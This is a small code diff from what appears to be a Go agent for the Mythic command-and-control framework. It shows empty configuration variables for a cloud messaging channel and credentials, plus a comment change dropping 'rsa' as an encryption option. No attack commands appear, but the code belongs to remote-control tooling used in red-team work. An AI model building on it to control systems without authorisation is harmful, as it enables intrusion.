@@ -116,7 +116,7 @@ var projectID = ""
 var resultsTopic = ""
 var tasksSubscription = ""
 var credentialsJSON = ""
-var encryptionMode = "" // "aes256_hmac", "rsa", or "none"
+var encryptionMode = "" // "aes256_hmac" or "none"
 
 // setAgentID uses reflection to override the agent's private id field
 // This is necessary because Mythic expects the agent to use the payloadID,
